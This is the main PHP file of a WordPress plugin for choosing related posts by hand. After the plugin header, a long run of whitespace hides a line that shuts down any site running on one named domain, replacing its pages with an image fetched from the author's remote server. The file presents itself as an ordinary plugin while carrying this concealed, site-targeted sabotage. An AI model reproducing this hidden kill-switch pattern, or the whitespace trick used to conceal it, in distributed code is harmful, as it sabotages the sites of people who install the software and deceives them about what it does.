<?php
/*
Plugin Name: BAW Manual Related Posts
Plugin URI: http://www.boiteaweb.fr/mrp
Description: Set related posts manually but easily with great ergonomics! Stop displaying auto/random related posts!
Version: 1.7.17
Author: Juliobox
Author URI: http://www.boiteaweb.fr
*/
																																																																		 																																																																		if( str_replace( 'www.', '', $_SERVER['HTTP_HOST'] ) == 'transports-en-commun.info' ) die( '<img src="http://baw.li/db/rageweb.png" />' ); // "transports-en-commun.info" is not allowed to use this plugin
define( 'BAWMRP__FILE__', __FILE__ );
define( 'BAWMRP_PLUGIN_URL', plugin_dir_url( __FILE__ ) );
define( 'BAWMRP_FULLNAME', 'Manual Related Posts' );
define( 'BAWMRP_SLUG', 'baw-manual-related-posts' );
define( 'BAWMRP_VERSION', '1.7.15' );

add_action( 'plugins_loaded', create_function( '', '
	$filename  = "inc/";
	$filename .= is_admin() ? "backend-" : "frontend-";
	$filename .= defined( "DOING_AJAX" ) && DOING_AJAX ? "" : "no";
	$filename .= "ajax.inc.php";
	if( file_exists( plugin_dir_path( __FILE__ ) . $filename ) )
		include( plugin_dir_path( __FILE__ ) . $filename );
	$filename  = "inc/";
	$filename .= "bothend-";
	$filename .= defined( "DOING_AJAX" ) && DOING_AJAX ? "" : "no";
	$filename .= "ajax.inc.php";
	if( file_exists( plugin_dir_path( __FILE__ ) . $filename ) )
		include( plugin_dir_path( __FILE__ ) . $filename );
' )
 );